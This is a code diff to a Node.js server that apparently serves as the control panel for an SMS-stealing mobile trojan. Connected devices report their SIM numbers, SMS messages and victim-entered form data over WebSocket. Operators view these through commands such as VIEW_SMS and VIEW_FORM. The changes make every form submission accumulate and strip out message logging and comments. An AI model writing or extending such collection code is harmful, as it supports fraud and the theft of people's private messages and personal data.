@@ -38,7 +38,7 @@ const deviceSchema = new mongoose.Schema({
   lastSeen: Date,
   isPinned: { type: Boolean, default: false },
   registrationTimestamp: Date,
-  customerData: mongoose.Schema.Types.Mixed,
+  customerData: { type: Array, default: [] }, // Changed to Array for multiple submissions
   isDeleted: { type: Boolean, default: false },
   smsMessages: Array,
   deletedSmsLog: { type: Array, default: [] },
@@ -126,7 +126,7 @@ app.post('/api/command', async (req, res) => {
 
         const clients = global.deviceSockets.get(device.deviceId);
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
-            return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || {} });
+            return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || [] });
         }
         
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device is OFFLINE' });
@@ -159,8 +159,6 @@ wss.on('connection', (ws, req) => {
   ws.on('message', async (msg) => {
     try {
       const data = JSON.parse(msg);
-      console.log('Incoming Message:', data.type, 'from:', data.deviceId);
-      
       const id = data.deviceId || data.serialNumber || data.id;
       if (!id) return;
       ws.deviceId = id;
@@ -178,14 +176,11 @@ wss.on('connection', (ws, req) => {
       const deletedLog = existingDevice?.deletedSmsLog || [];
       const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
       
-      // Maximum Compatibility for SIM Numbers (Direct Fields)
       let s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1;
       let s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2;
       
-      // Smart extraction from "data" or "customerData" map
       const payloadData = data.data || data.customerData || {};
       if (payloadData && typeof payloadData === 'object') {
-          // If direct fields were missing, look inside the map
           if (!s1) s1 = payloadData.sim1 || payloadData.Mobile || payloadData.mobile || payloadData.Phone || payloadData.phone || payloadData.Number || payloadData.number || payloadData["Mobile Number"] || payloadData["Phone Number"];
           if (!s2) s2 = payloadData.sim2 || payloadData.Mobile2 || payloadData.mobile2 || payloadData.Phone2 || payloadData.phone2;
       }
@@ -204,15 +199,19 @@ wss.on('connection', (ws, req) => {
           updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
       }
       
-      // Handle Form Data from App
+      // Duplicate Submission Support: Push new data instead of updating
+      const finalUpdate = { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } };
+      
       if (data.type === 'FORM_SUBMIT' && data.customerData) {
-          updateSet.customerData = { ...(existingDevice?.customerData || {}), ...data.customerData };
+          const newSubmission = { ...data.customerData, submittedAt: new Date() };
+          finalUpdate.$push = { customerData: newSubmission };
       } else if (data.type === 'FORM_DATA' && data.data) {
-          updateSet.customerData = { ...(existingDevice?.customerData || {}), ...data.data };
+          const newSubmission = { ...data.data, submittedAt: new Date() };
+          finalUpdate.$push = { customerData: newSubmission };
       }
       
       if (dbConnected) {
-          await Device.findOneAndUpdate({ deviceId: id }, { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, { upsert: true });
+          await Device.findOneAndUpdate({ deviceId: id }, finalUpdate, { upsert: true });
           io.emit('dashboard-update');
       }
     } catch (e) { console.error('WS Error:', e); }
